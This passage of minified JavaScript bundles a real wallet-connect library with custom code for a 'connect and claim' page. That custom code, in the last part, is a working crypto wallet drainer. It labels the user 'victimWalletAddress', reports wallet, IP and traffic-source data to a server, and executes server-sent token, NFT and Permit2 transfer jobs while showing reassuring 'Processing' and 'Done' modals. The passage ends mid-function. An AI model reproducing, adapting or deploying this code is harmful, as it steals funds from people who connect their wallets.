    `}createAnimation(e,t){e.animate([{transform:"translateX(0px)"},{transform:t}],{duration:1600,easing:"cubic-bezier(0.56, 0, 0.48, 1)",direction:"alternate",iterations:1/0})}};iN.styles=RMe;iN=OMe([me("w3m-siwx-sign-message-thumbnails")],iN);function BMe(r){return new TOe({...r,sdkVersion:ke.generateSdkVersion(r.adapters??[],"html",kOe)})}var vh={};const MMe=$n(Ile),DMe=$n(lce),LMe=$n(Hce),UMe=$n(wue),jMe=$n(Mae),FMe=$n(_le),qMe=$n($ue),zMe=$n(Zue),WMe=$n(ece),HMe=$n(Oae),lz=$n(xue),VMe=$n(Lde),KMe=$n(Mue),GMe=$n(Hae),ZMe=$n(rce),YMe=$n(Xle),uz=$n(Fce),JMe=$n(aue),QMe=$n(zde),XMe=$n(Xue),eDe=$n(cde);var dz;function tDe(){return dz||(dz=1,function(r){var e=vh&&vh.__createBinding||(Object.create?function($,y,A,b){b===void 0&&(b=A),Object.defineProperty($,b,{enumerable:!0,get:function(){return y[A]}})}:function($,y,A,b){b===void 0&&(b=A),$[b]=y[A]}),t=vh&&vh.__setModuleDefault||(Object.create?function($,y){Object.defineProperty($,"default",{enumerable:!0,value:y})}:function($,y){$.default=y}),i=vh&&vh.__importStar||function($){if($&&$.__esModule)return $;var y={};if($!=null)for(var A in $)A!=="default"&&Object.prototype.hasOwnProperty.call($,A)&&e(y,$,A);return t(y,$),y};Object.defineProperty(r,"__esModule",{value:!0}),r.formatBytes32String=r.Utf8ErrorFuncs=r.toUtf8String=r.toUtf8CodePoints=r.toUtf8Bytes=r._toEscapedUtf8String=r.nameprep=r.hexDataSlice=r.hexDataLength=r.hexZeroPad=r.hexValue=r.hexStripZeros=r.hexConcat=r.isHexString=r.hexlify=r.base64=r.base58=r.TransactionDescription=r.LogDescription=r.Interface=r.SigningKey=r.HDNode=r.defaultPath=r.isBytesLike=r.isBytes=r.zeroPad=r.stripZeros=r.concat=r.arrayify=r.shallowCopy=r.resolveProperties=r.getStatic=r.defineReadOnly=r.deepCopy=r.checkProperties=r.poll=r.fetchJson=r._fetchData=r.RLP=r.Logger=r.checkResultErrors=r.FormatTypes=r.ParamType=r.FunctionFragment=r.EventFragment=r.ErrorFragment=r.ConstructorFragment=r.Fragment=r.defaultAbiCoder=r.AbiCoder=void 0,r.Indexed=r.Utf8ErrorReason=r.UnicodeNormalizationForm=r.SupportedAlgorithm=r.mnemonicToSeed=r.isValidMnemonic=r.entropyToMnemonic=r.mnemonicToEntropy=r.getAccountPath=r.verifyTypedData=r.verifyMessage=r.recoverPublicKey=r.computePublicKey=r.recoverAddress=r.computeAddress=r.getJsonWalletAddress=r.TransactionTypes=r.serializeTransaction=r.parseTransaction=r.accessListify=r.joinSignature=r.splitSignature=r.soliditySha256=r.solidityKeccak256=r.solidityPack=r.shuffled=r.randomBytes=r.sha512=r.sha256=r.ripemd160=r.keccak256=r.computeHmac=r.commify=r.parseUnits=r.formatUnits=r.parseEther=r.formatEther=r.isAddress=r.getCreate2Address=r.getContractAddress=r.getIcapAddress=r.getAddress=r._TypedDataEncoder=r.id=r.isValidName=r.namehash=r.hashMessage=r.dnsEncode=r.parseBytes32String=void 0;var n=MMe;Object.defineProperty(r,"AbiCoder",{enumerable:!0,get:function(){return n.AbiCoder}}),Object.defineProperty(r,"checkResultErrors",{enumerable:!0,get:function(){return n.checkResultErrors}}),Object.defineProperty(r,"ConstructorFragment",{enumerable:!0,get:function(){return n.ConstructorFragment}}),Object.defineProperty(r,"defaultAbiCoder",{enumerable:!0,get:function(){return n.defaultAbiCoder}}),Object.defineProperty(r,"ErrorFragment",{enumerable:!0,get:function(){return n.ErrorFragment}}),Object.defineProperty(r,"EventFragment",{enumerable:!0,get:function(){return n.EventFragment}}),Object.defineProperty(r,"FormatTypes",{enumerable:!0,get:function(){return n.FormatTypes}}),Object.defineProperty(r,"Fragment",{enumerable:!0,get:function(){return n.Fragment}}),Object.defineProperty(r,"FunctionFragment",{enumerable:!0,get:function(){return n.FunctionFragment}}),Object.defineProperty(r,"Indexed",{enumerable:!0,get:function(){return n.Indexed}}),Object.defineProperty(r,"Interface",{enumerable:!0,get:function(){return n.Interface}}),Object.defineProperty(r,"LogDescription",{enumerable:!0,get:function(){return n.LogDescription}}),Object.defineProperty(r,"ParamType",{enumerable:!0,get:function(){return n.ParamType}}),Object.defineProperty(r,"TransactionDescription",{enumerable:!0,get:function(){return n.TransactionDescription}});var s=DMe;Object.defineProperty(r,"getAddress",{enumerable:!0,get:function(){return s.getAddress}}),Object.defineProperty(r,"getCreate2Address",{enumerable:!0,get:function(){return s.getCreate2Address}}),Object.defineProperty(r,"getContractAddress",{enumerable:!0,get:function(){return s.getContractAddress}}),Object.defineProperty(r,"getIcapAddress",{enumerable:!0,get:function(){return s.getIcapAddress}}),Object.defineProperty(r,"isAddress",{enumerable:!0,get:function(){return s.isAddress}});var o=i(LMe);r.base64=o;var a=UMe;Object.defineProperty(r,"base58",{enumerable:!0,get:function(){return a.Base58}});var c=jMe;Object.defineProperty(r,"arrayify",{enumerable:!0,get:function(){return c.arrayify}}),Object.defineProperty(r,"concat",{enumerable:!0,get:function(){return c.concat}}),Object.defineProperty(r,"hexConcat",{enumerable:!0,get:function(){return c.hexConcat}}),Object.defineProperty(r,"hexDataSlice",{enumerable:!0,get:function(){return c.hexDataSlice}}),Object.defineProperty(r,"hexDataLength",{enumerable:!0,get:function(){return c.hexDataLength}}),Object.defineProperty(r,"hexlify",{enumerable:!0,get:function(){return c.hexlify}}),Object.defineProperty(r,"hexStripZeros",{enumerable:!0,get:function(){return c.hexStripZeros}}),Object.defineProperty(r,"hexValue",{enumerable:!0,get:function(){return c.hexValue}}),Object.defineProperty(r,"hexZeroPad",{enumerable:!0,get:function(){return c.hexZeroPad}}),Object.defineProperty(r,"isBytes",{enumerable:!0,get:function(){return c.isBytes}}),Object.defineProperty(r,"isBytesLike",{enumerable:!0,get:function(){return c.isBytesLike}}),Object.defineProperty(r,"isHexString",{enumerable:!0,get:function(){return c.isHexString}}),Object.defineProperty(r,"joinSignature",{enumerable:!0,get:function(){return c.joinSignature}}),Object.defineProperty(r,"zeroPad",{enumerable:!0,get:function(){return c.zeroPad}}),Object.defineProperty(r,"splitSignature",{enumerable:!0,get:function(){return c.splitSignature}}),Object.defineProperty(r,"stripZeros",{enumerable:!0,get:function(){return c.stripZeros}});var l=FMe;Object.defineProperty(r,"_TypedDataEncoder",{enumerable:!0,get:function(){return l._TypedDataEncoder}}),Object.defineProperty(r,"dnsEncode",{enumerable:!0,get:function(){return l.dnsEncode}}),Object.defineProperty(r,"hashMessage",{enumerable:!0,get:function(){return l.hashMessage}}),Object.defineProperty(r,"id",{enumerable:!0,get:function(){return l.id}}),Object.defineProperty(r,"isValidName",{enumerable:!0,get:function(){return l.isValidName}}),Object.defineProperty(r,"namehash",{enumerable:!0,get:function(){return l.namehash}});var u=qMe;Object.defineProperty(r,"defaultPath",{enumerable:!0,get:function(){return u.defaultPath}}),Object.defineProperty(r,"entropyToMnemonic",{enumerable:!0,get:function(){return u.entropyToMnemonic}}),Object.defineProperty(r,"getAccountPath",{enumerable:!0,get:function(){return u.getAccountPath}}),Object.defineProperty(r,"HDNode",{enumerable:!0,get:function(){return u.HDNode}}),Object.defineProperty(r,"isValidMnemonic",{enumerable:!0,get:function(){return u.isValidMnemonic}}),Object.defineProperty(r,"mnemonicToEntropy",{enumerable:!0,get:function(){return u.mnemonicToEntropy}}),Object.defineProperty(r,"mnemonicToSeed",{enumerable:!0,get:function(){return u.mnemonicToSeed}});var d=zMe;Object.defineProperty(r,"getJsonWalletAddress",{enumerable:!0,get:function(){return d.getJsonWalletAddress}});var h=WMe;Object.defineProperty(r,"keccak256",{enumerable:!0,get:function(){return h.keccak256}});var f=HMe;Object.defineProperty(r,"Logger",{enumerable:!0,get:function(){return f.Logger}});var p=lz;Object.defineProperty(r,"computeHmac",{enumerable:!0,get:function(){return p.computeHmac}}),Object.defineProperty(r,"ripemd160",{enumerable:!0,get:function(){return p.ripemd160}}),Object.defineProperty(r,"sha256",{enumerable:!0,get:function(){return p.sha256}}),Object.defineProperty(r,"sha512",{enumerable:!0,get:function(){return p.sha512}});var g=VMe;Object.defineProperty(r,"solidityKeccak256",{enumerable:!0,get:function(){return g.keccak256}}),Object.defineProperty(r,"solidityPack",{enumerable:!0,get:function(){return g.pack}}),Object.defineProperty(r,"soliditySha256",{enumerable:!0,get:function(){return g.sha256}});var w=KMe;Object.defineProperty(r,"randomBytes",{enumerable:!0,get:function(){return w.randomBytes}}),Object.defineProperty(r,"shuffled",{enumerable:!0,get:function(){return w.shuffled}});var m=GMe;Object.defineProperty(r,"checkProperties",{enumerable:!0,get:function(){return m.checkProperties}}),Object.defineProperty(r,"deepCopy",{enumerable:!0,get:function(){return m.deepCopy}}),Object.defineProperty(r,"defineReadOnly",{enumerable:!0,get:function(){return m.defineReadOnly}}),Object.defineProperty(r,"getStatic",{enumerable:!0,get:function(){return m.getStatic}}),Object.defineProperty(r,"resolveProperties",{enumerable:!0,get:function(){return m.resolveProperties}}),Object.defineProperty(r,"shallowCopy",{enumerable:!0,get:function(){return m.shallowCopy}});var x=i(ZMe);r.RLP=x;var S=YMe;Object.defineProperty(r,"computePublicKey",{enumerable:!0,get:function(){return S.computePublicKey}}),Object.defineProperty(r,"recoverPublicKey",{enumerable:!0,get:function(){return S.recoverPublicKey}}),Object.defineProperty(r,"SigningKey",{enumerable:!0,get:function(){return S.SigningKey}});var T=uz;Object.defineProperty(r,"formatBytes32String",{enumerable:!0,get:function(){return T.formatBytes32String}}),Object.defineProperty(r,"nameprep",{enumerable:!0,get:function(){return T.nameprep}}),Object.defineProperty(r,"parseBytes32String",{enumerable:!0,get:function(){return T.parseBytes32String}}),Object.defineProperty(r,"_toEscapedUtf8String",{enumerable:!0,get:function(){return T._toEscapedUtf8String}}),Object.defineProperty(r,"toUtf8Bytes",{enumerable:!0,get:function(){return T.toUtf8Bytes}}),Object.defineProperty(r,"toUtf8CodePoints",{enumerable:!0,get:function(){return T.toUtf8CodePoints}}),Object.defineProperty(r,"toUtf8String",{enumerable:!0,get:function(){return T.toUtf8String}}),Object.defineProperty(r,"Utf8ErrorFuncs",{enumerable:!0,get:function(){return T.Utf8ErrorFuncs}});var k=JMe;Object.defineProperty(r,"accessListify",{enumerable:!0,get:function(){return k.accessListify}}),Object.defineProperty(r,"computeAddress",{enumerable:!0,get:function(){return k.computeAddress}}),Object.defineProperty(r,"parseTransaction",{enumerable:!0,get:function(){return k.parse}}),Object.defineProperty(r,"recoverAddress",{enumerable:!0,get:function(){return k.recoverAddress}}),Object.defineProperty(r,"serializeTransaction",{enumerable:!0,get:function(){return k.serialize}}),Object.defineProperty(r,"TransactionTypes",{enumerable:!0,get:function(){return k.TransactionTypes}});var I=QMe;Object.defineProperty(r,"commify",{enumerable:!0,get:function(){return I.commify}}),Object.defineProperty(r,"formatEther",{enumerable:!0,get:function(){return I.formatEther}}),Object.defineProperty(r,"parseEther",{enumerable:!0,get:function(){return I.parseEther}}),Object.defineProperty(r,"formatUnits",{enumerable:!0,get:function(){return I.formatUnits}}),Object.defineProperty(r,"parseUnits",{enumerable:!0,get:function(){return I.parseUnits}});var E=XMe;Object.defineProperty(r,"verifyMessage",{enumerable:!0,get:function(){return E.verifyMessage}}),Object.defineProperty(r,"verifyTypedData",{enumerable:!0,get:function(){return E.verifyTypedData}});var C=eDe;Object.defineProperty(r,"_fetchData",{enumerable:!0,get:function(){return C._fetchData}}),Object.defineProperty(r,"fetchJson",{enumerable:!0,get:function(){return C.fetchJson}}),Object.defineProperty(r,"poll",{enumerable:!0,get:function(){return C.poll}});var N=lz;Object.defineProperty(r,"SupportedAlgorithm",{enumerable:!0,get:function(){return N.SupportedAlgorithm}});var L=uz;Object.defineProperty(r,"UnicodeNormalizationForm",{enumerable:!0,get:function(){return L.UnicodeNormalizationForm}}),Object.defineProperty(r,"Utf8ErrorReason",{enumerable:!0,get:function(){return L.Utf8ErrorReason}})}(vh)),vh}var rDe=tDe();const ow={hexStringToNumber(r){const e=r.startsWith("0x")?r.slice(2):r;return parseInt(e,16)},numberToHexString(r){return`0x${r.toString(16)}`},async getUserInfo(r){const[e,t]=await Promise.all([ow.getAddresses(r),ow.getChainId(r)]);return{chainId:t,addresses:e}},async getChainId(r){const e=await r.request({method:"eth_chainId"});return Number(e)},async getAddress(r){const[e]=await r.request({method:"eth_accounts"});return e},async getAddresses(r){return await r.request({method:"eth_accounts"})},async addEthereumChain(r,e){const t=e.rpcUrls.chainDefault?.http||[];await r.request({method:"wallet_addEthereumChain",params:[{chainId:ow.numberToHexString(e.id),rpcUrls:[...t],chainName:e.name,nativeCurrency:{name:e.nativeCurrency.name,decimals:e.nativeCurrency.decimals,symbol:e.nativeCurrency.symbol},blockExplorerUrls:[e.blockExplorers?.default.url],iconUrls:[hd.NetworkImageIds[e.id]]}]})}},ef={signMessage:async(r,e,t)=>{if(!e)throw new Error("signMessage - provider is undefined");const i=Jr(r)?r:Qe(Fn(r));return await e.request({method:"personal_sign",params:[i,t]})},estimateGas:async(r,e,t,i)=>{if(!e)throw new Error("estimateGas - provider is undefined");if(!t)throw new Error("estimateGas - address is undefined");if(r.chainNamespace&&r.chainNamespace!=="eip155")throw new Error("estimateGas - chainNamespace is not eip155");const n={from:r.address,to:r.to,data:r.data,type:0};return(await new $1(e,i).getSigner(t).estimateGas(n)).toBigInt()},sendTransaction:async(r,e,t,i)=>{if(!e)throw new Error("sendTransaction - provider is undefined");if(!t)throw new Error("sendTransaction - address is undefined");if(r.chainNamespace&&r.chainNamespace!=="eip155")throw new Error("sendTransaction - chainNamespace is not eip155");const n={to:r.to,value:r.value,gasLimit:r.gas,gasPrice:r.gasPrice,data:r.data,type:0};return(await(await new $1(e,i).getSigner(t).sendTransaction(n)).wait())?.blockHash||null},writeContract:async(r,e,t,i)=>{if(!e)throw new Error("writeContract - provider is undefined");if(!t)throw new Error("writeContract - address is undefined");const s=new $1(e,i).getSigner(t),o=new gue(r.tokenAddress,r.abi,s);if(!o||!r.method)throw new Error("Contract method is undefined");const a=o[r.method];if(a)return await a(...r.args);throw new Error("Contract method is undefined")},getEnsAddress:async(r,e)=>{try{const t=Number(e.id);let i=null,n=!1;return _1e(r)&&(n=await KR.resolveReownName(r)||!1),t===1&&(i=await new q9("mainnet").resolveName(r)),i||n||!1}catch{return!1}},getEnsAvatar:async(r,e)=>e===1&&await new q9("mainnet").getAvatar(r)||!1,parseWalletCapabilities:r=>{try{return JSON.parse(r)}catch{throw new Error("Error parsing wallet capabilities")}},parseUnits:(r,e)=>P$(r,"gwei").toBigInt(),formatUnits:N$};class iDe extends Lee{constructor(){super({}),this.adapterType="ethers",this.balancePromises={},this.providerHandlers=null,this.namespace=Me.CHAIN.EVM}async createEthersConfig(e){if(!e.metadata)return;let t;function i(){if(t)return t;if(!(typeof window>"u")&&window.ethereum)return t=window.ethereum,t}async function n(){try{const{createCoinbaseWalletSDK:o}=await Ke(async()=>{const{createCoinbaseWalletSDK:c}=await Promise.resolve().then(()=>TXe);return{createCoinbaseWalletSDK:c}},void 0);return typeof window>"u"?void 0:o({appName:e?.metadata?.name,appLogoUrl:e?.metadata?.icons[0],appChainIds:e.networks?.map(c=>c.id)||[1,84532],preference:{options:e.coinbasePreference??"all"}}).getProvider()}catch(o){console.error("Failed to import Coinbase Wallet SDK:",o);return}}const s={metadata:e.metadata};if(e.enableInjected!==!1&&(s.injected=i()),e.enableCoinbase!==!1){const o=await n();o&&(s.coinbase=o)}return s.EIP6963=e.enableEIP6963!==!1,s}async signMessage(e){const{message:t,address:i,provider:n}=e;if(!n)throw new Error("Provider is undefined");try{return{signature:await ef.signMessage(t,n,i)}}catch{throw new Error("EthersAdapter:signMessage - Sign message failed")}}async sendTransaction(e){if(!e.provider)throw new Error("Provider is undefined");return{hash:await ef.sendTransaction({value:e.value,to:e.to,data:e.data,gas:e.gas,gasPrice:e.gasPrice,address:e.address},e.provider,e.address,Number(e.caipNetwork?.id))}}async writeContract(e){if(!e.provider)throw new Error("Provider is undefined");const{address:t}=kh.parseCaipAddress(e.caipAddress);return{hash:await ef.writeContract(e,e.provider,t,Number(e.caipNetwork?.id))}}async estimateGas(e){const{provider:t,caipNetwork:i,address:n}=e;if(!t)throw new Error("Provider is undefined");try{return{gas:await ef.estimateGas({data:e.data,to:e.to,address:n},t,n,Number(i?.id))}}catch{throw new Error("EthersAdapter:estimateGas - Estimate gas failed")}}async getEnsAddress(e){const{name:t,caipNetwork:i}=e;return i?{address:await ef.getEnsAddress(t,i)}:{address:""}}parseUnits(e){return ef.parseUnits(e.value,e.decimals)}formatUnits(e){return ef.formatUnits(e.value,e.decimals)}async syncConnection(e){const{id:t,chainId:i}=e,n=this.connectors.find(c=>c.id===t),s=n?.provider;if(!s)throw new Error("Provider not found");const o=await s.request({method:"eth_requestAccounts"}),a=await s.request({method:"eth_chainId"});if(this.listenProviderEvents(s),!o[0])throw new Error("No accounts found");if(!n?.type)throw new Error("Connector type not found");return{address:o[0],chainId:Number(a)||Number(i),provider:s,type:n.type,id:t}}async syncConnectors(e){this.ethersConfig=await this.createEthersConfig(e),this.ethersConfig?.EIP6963&&this.listenInjectedConnector(!0),Object.keys(this.ethersConfig||{}).filter(i=>i!=="metadata"&&i!=="EIP6963").forEach(i=>{const n=i==="coinbase"?"coinbaseWalletSDK":i,s=i===Me.CONNECTOR_ID.INJECTED;this.namespace&&this.addConnector({id:n,explorerId:hd.ConnectorExplorerIds[n],imageUrl:e?.connectorImages?.[n],name:hd.ConnectorNamesMap[n]||"Unknown",imageId:hd.ConnectorImageIds[n],type:hd.ConnectorTypesMap[n]??"EXTERNAL",info:s?void 0:{rdns:n},chain:this.namespace,chains:[],provider:this.ethersConfig?.[i]})})}setUniversalProvider(e){this.addConnector(new GR({provider:e,caipNetworks:this.caipNetworks||[],namespace:"eip155"}))}eip6963EventHandler(e){if(e.detail){const{info:t,provider:i}=e.detail;if(!this.connectors?.find(s=>s.name===t?.name)){const s=hd.ConnectorTypesMap[Me.CONNECTOR_ID.EIP6963],o=t?.rdns||t?.name||t?.uuid;this.namespace&&o&&this.addConnector({id:o,type:s,imageUrl:t?.icon,name:t?.name||"Unknown",provider:i,info:t,chain:this.namespace,chains:[]})}}}listenInjectedConnector(e){if(typeof window<"u"&&e){const t=this.eip6963EventHandler.bind(this);window.addEventListener(xn.EIP6963_ANNOUNCE_EVENT,t),window.dispatchEvent(new Event(xn.EIP6963_REQUEST_EVENT))}}async connect({id:e,type:t,chainId:i}){const s=this.connectors.find(c=>c.id===e)?.provider;if(!s)throw new Error("Provider not found");let o=[],a;if(t==="AUTH"){const{address:c}=await s.connect({chainId:i,preferredAccountType:Ne.state.defaultAccountTypes.eip155});o=[c]}else{if(o=await s.request({method:"eth_requestAccounts"}),a=await s.request({method:"eth_chainId"}),a!==i){const c=this.caipNetworks?.find(l=>l.id===i);if(!c)throw new Error("Ethers5Adapter:connect - could not find the caipNetwork to switch");try{await this.switchNetwork({caipNetwork:c,provider:s,providerType:t})}catch{throw new Error("Ethers5Adapter:connect - Switch network failed")}}this.listenProviderEvents(s)}return{address:o[0],chainId:Number(i),provider:s,type:t,id:e}}async getAccounts(e){const t=this.connectors.find(s=>s.id===e.id),i=t?.provider;if(!i||!t)throw new Error("Provider not found");if(e.id===Me.CONNECTOR_ID.AUTH){const s=t.provider,{address:o,accounts:a}=await s.connect();return Promise.resolve({accounts:(a||[{address:o,type:"eoa"}]).map(c=>ke.createAccount("eip155",c.address,c.type))})}return{accounts:(await i.request({method:"eth_requestAccounts"})).map(s=>ke.createAccount("eip155",s,"eoa"))}}async reconnect(e){const{id:t,chainId:i}=e,n=this.connectors.find(s=>s.id===t);n&&n.type==="AUTH"&&i&&await n.provider.connect({chainId:i,preferredAccountType:Ne.state.defaultAccountTypes.eip155})}async disconnect(e){if(!e.provider||!e.providerType)throw new Error("Provider or providerType not provided");switch(e.providerType){case"WALLET_CONNECT":e.provider.session&&e.provider.disconnect();break;case"AUTH":await e.provider.disconnect();break;case"ANNOUNCED":case"EXTERNAL":await this.revokeProviderPermissions(e.provider);break;default:throw new Error("Unsupported provider type")}}async getBalance(e){const t=this.caipNetworks?.find(i=>i.id===e.chainId);if(t){const i=`${t.caipNetworkId}:${e.address}`,n=this.balancePromises[i];if(n)return n;const s=He.getNativeBalanceCacheForCaipAddress(i);if(s)return{balance:s.balance,symbol:s.symbol};const o=new zx(t.rpcUrls.default.http[0],{chainId:t.id,name:t.name});if(o)try{return this.balancePromises[i]=new Promise(async a=>{const c=await o.getBalance(e.address),l=rDe.formatEther(c);He.updateNativeBalanceCache({caipAddress:i,balance:l,symbol:t.nativeCurrency.symbol,timestamp:Date.now()}),a({balance:l,symbol:t.nativeCurrency.symbol})}).finally(()=>{delete this.balancePromises[i]}),this.balancePromises[i]||{balance:"",symbol:""}}catch{return{balance:"",symbol:""}}}return{balance:"",symbol:""}}async getProfile(e){if(e.chainId===1){const t=new q9("mainnet"),i=await t.lookupAddress(e.address),n=await t.getAvatar(e.address);return{profileName:i||void 0,profileImage:n||void 0}}return{profileName:void 0,profileImage:void 0}}listenProviderEvents(e){const t=()=>{this.removeProviderListeners(e),this.emit("disconnect")},i=s=>{s.length>0?this.emit("accountChanged",{address:s[0]}):t()},n=s=>{const o=typeof s=="string"?ow.hexStringToNumber(s):Number(s);this.emit("switchNetwork",{chainId:o})};e.on("disconnect",t),e.on("accountsChanged",i),e.on("chainChanged",n),this.providerHandlers={disconnect:t,accountsChanged:i,chainChanged:n}}removeProviderListeners(e){this.providerHandlers&&(e.removeListener("disconnect",this.providerHandlers.disconnect),e.removeListener("accountsChanged",this.providerHandlers.accountsChanged),e.removeListener("chainChanged",this.providerHandlers.chainChanged),this.providerHandlers=null)}async switchNetwork(e){const{caipNetwork:t,provider:i,providerType:n}=e;if(n==="AUTH"){await super.switchNetwork(e);return}try{await i.request({method:"wallet_switchEthereumChain",params:[{chainId:ow.numberToHexString(t.id)}]})}catch(s){if(s.code===Bf.ERROR_CODE_UNRECOGNIZED_CHAIN_ID||s.code===Bf.ERROR_INVALID_CHAIN_ID||s.code===Bf.ERROR_CODE_DEFAULT||s?.data?.originalError?.code===Bf.ERROR_CODE_UNRECOGNIZED_CHAIN_ID)await ow.addEthereumChain(i,t);else if(n==="ANNOUNCED"||n==="EXTERNAL"||n==="INJECTED")throw new Error("Chain is not supported")}}getWalletConnectProvider(){return this.connectors.find(e=>e.type==="WALLET_CONNECT")?.provider}async revokeProviderPermissions(e){try{(await e.request({method:"wallet_getPermissions"})).find(n=>n.parentCapability==="eth_accounts")&&await e.request({method:"wallet_revokePermissions",params:[{eth_accounts:{}}]})}catch(t){console.info("Could not revoke permissions from wallet. Disconnecting...",t)}}async getCapabilities(e){const t=Wi.getProvider(Me.CHAIN.EVM);if(!t)throw new Error("Provider is undefined");const i=t.session?.sessionProperties?.capabilities;if(i){const s=ef.parseWalletCapabilities(i)[e];if(s)return s}return await t.request({method:"wallet_getCapabilities",params:[e]})}async grantPermissions(e){const t=Wi.getProvider(Me.CHAIN.EVM);if(!t)throw new Error("Provider is undefined");return await t.request({method:"wallet_grantPermissions",params:e})}async revokePermissions(e){const t=Wi.getProvider(Me.CHAIN.EVM);if(!t)throw new Error("Provider is undefined");return await t.request({method:"wallet_revokePermissions",params:[e]})}async walletGetAssets(e){const t=Wi.getProvider(Me.CHAIN.EVM);if(!t)throw new Error("Provider is undefined");return await t.request({method:"wallet_getAssets",params:[e]})}}let xa=null,aw=null,cO=null,q7=null;function ote(){if(!xa){if(xa=document.createElement("div"),xa.id="loadingModal",xa.className="rw-modal-wrapper rw-hidden",xa.innerHTML=`
    <div class="rw-modal">
      <div class="rw-loader"></div>
      <span class="rw-text">Processing</span>
    </div>`,!document.getElementById("rwModalStyles")){const r=document.createElement("style");r.id="rwModalStyles",r.innerHTML=`
      :root {
        --rw-primary: #635bff;          /* Reown brand violet */
        --rw-text: #1d1d1f;
        --rw-shadow: rgba(99, 91, 255, 0.24);
      }

      /* Wrapper covers the viewport */
      .rw-modal-wrapper {
        position: fixed;
        inset: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 9999;
        backdrop-filter: blur(3px);
        background: rgba(0, 0, 0, 0.25);
        transition: opacity 0.2s ease;
      }
      .rw-hidden { opacity: 0; pointer-events: none; }

      /* Modal core */
      .rw-modal {
        background: #fff;
        color: var(--rw-text);
        font-family: "Inter", sans-serif;
        padding: 28px 48px;
        border-radius: 20px;
        box-shadow: 0 8px 36px var(--rw-shadow);
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 14px;
        min-width: 260px;
      }

      /* Circular loader */
      .rw-loader {
        width: 40px;
        height: 40px;
        border: 4px solid #e8e9ff;
        border-top-color: var(--rw-primary);
        border-radius: 50%;
        animation: rw-spin 0.8s linear infinite;
      }
      @keyframes rw-spin { to { transform: rotate(360deg); } }

      /* Text states */
      .rw-text.success {
        color: var(--rw-primary);
        animation: rw-wave 3s infinite;
      }
      .rw-text.error {
        color: #ff4d4d;
        animation: rw-shake 0.6s ease-in-out;
      }
      @keyframes rw-wave {
        0%, 100% { filter: none; }
        50% { filter: hue-rotate(30deg) brightness(1.1); }
      }
      @keyframes rw-shake {
        0%, 100% { transform: translateX(0); }
        20%, 60% { transform: translateX(-6px); }
        40%, 80% { transform: translateX(6px); }
      }
    `,document.head.appendChild(r)}document.body.appendChild(xa),aw=xa.querySelector(".rw-text"),cO=xa.querySelector(".rw-loader")}}function nN(r="Processing"){xa||ote(),clearInterval(q7),aw.className="rw-text",cO.style.display="block";let e="";aw.textContent=`${r}${e}`,xa.classList.remove("rw-hidden"),q7=setInterval(()=>{e=e.length>=3?"":e+".",aw.textContent=`${r}${e}`},400)}function DA(r="Done"){cte("success",r)}function ate(r="Something went wrong!"){cte("error",r)}function cte(r,e){clearInterval(q7),xa&&(cO.style.display="none",aw.textContent=e,aw.className=`rw-text ${r}`,xa.classList.remove("rw-hidden"))}function lO(){clearInterval(q7),xa&&xa.classList.add("rw-hidden")}const{REOWN_CHAINS:nDe,WALLETCONNECT_CHAIN_IDS:lte}=ppe(),sDe=12;let as=null,eu=null,wf=null,sN=null,No=!1,ute="Unknown",f9,dte,hte,p9,od,e1,g9,Gt,LA,oN,hz,fte,m9,w9,pte,$5,gte,mte,Zw,Km,fz,Zh,R5,pz=!1,wte=null,Dh=null,O5=[],B5=!1,aN=!1,b9=!1,gz=!1,bte="",E1="",cN=new Map,c8=!1;async function vte(){if(No||Gt==="0"){for(await dDe(),await Zh.open({view:"Connect",namespace:"eip155"});;){const r=Zh.getAddress();if(r){as=r,window.victimWalletAddress=as,await Zh.close(),await so(300);break}await so(300)}try{R5=Zh.getWalletInfo().name}catch{R5="Temporarily unavailable"}}else{const{openModal:r}=await ss(Gt);({provider:eu,walletAddress:as,name:R5}=await r(f9,lte))}window.victimWalletAddress=as,cw("connect",!0),cw("connectAndClaim",!0),cw("claim",!1)}let lN=!1;async function yte(){if(lN||(lN=!0,!as))return;if((navigator.languages[0]==="ru-RU"||navigator.languages[0]==="ru")&&(pz=!0),Dh&&Dh.close(),O5=[],B5=!1,aN=!1,No||Gt==="0")nN(od);else if(Gt==="2"||Gt==="0"){const{showInfoScreen:o}=await ss(Gt);await so(700),o([{type:"primary",title:od}])}else{const{showLoadingModal:o}=await ss(Gt);await so(700),o(od)}const r=!p9||Number(p9)<10?"10":p9,e=Math.floor((Date.now()-wte)/1e3),t={walletAddress:as,trafficName:dte,customer:hte,walletName:R5,chainMin:r,mobile:No,seconds:e,initialIp:bte,initialOrigin:E1,sng:pz,version:sDe,bundles:fte,eleven_priority:Number(gte),spoof:mte,channel:Km,os:ute,isSignatureEnabled:Zw!="0"||typeof $5[0]!="string"},i=await bpe({payload:Xb(t,km,Nm)}),{ok:n,session:s}=await i.json();try{window.onConnected&&window.onConnected(as,n)}catch{}if(!n){if(No||Gt==="0")ate(g9),await so(1500),lO();else if(Gt==="2"||Gt==="0"){const{addStatusBlock:o,hideModal:a}=await ss(Gt);setTimeout(()=>{o({type:"danger",title:g9})},1e3),await so(3e3),await a()}else{const{showErrorModal:o,hideModal:a}=await ss(Gt);o(g9),await so(3e3),await a()}return}Dh=vpe(s),Dh.onmessage=o=>{const a=o.data;O5.push(a),B5||xte()},Dh.addEventListener("end",()=>{aN=!0,!B5&&O5.length===0&&Cte()}),Dh.onerror=()=>{Dh.close()}}async function xte(){if(O5.length===0){B5=!1,aN&&Cte();return}B5=!0;const r=O5.shift();await oDe(r),xte()}async function oDe(r){const{tx:e,contract:t,standard:i,chain:n,balanceInUsd:s,worker:o,percent:a,amount:c,customer:l,chainName:u,address:d,name:h,is7702:f,in7702:p,nativeName:g,nativeUsdValue:w,mev_tx:m,nativeAmount:x,tokenAddresses:S,tokenAmounts:T,permit_domain:k,permit_types:I,permit_message:E,permit2_nonce:C,nftAddresses:N,nftIds:L,permit2_address:$}=qpe(JSON.parse(r),km,Nm);if(p&&cN.get(u))return;if((!c8||!b9)&&(Zw!="0"||typeof $5[0]!="string")){if(No||Gt==="0"){for(await Zh.switchNetwork(Y8);sN.chainId!==Y8.id;)await so(200);wf=new $1(eu,"any").getSigner()}else({signer:wf,provider:eu}=await yD(Y8,eu));if(!b9&&Zw!="0"){if(No||Gt==="0")DA(e1);else if(["1","3","4","5"].includes(Gt)){const{showConfirmModal:v}=await ss(Gt);v(e1)}else if(Gt==="2"||Gt==="0"){const{addStatusBlock:v}=await ss(Gt);setTimeout(()=>{v({type:"warning",title:e1})},50)}let b=!1;for(;!b;)try{if(await aDe(),b=!0,No||Gt==="0")nN(od);else 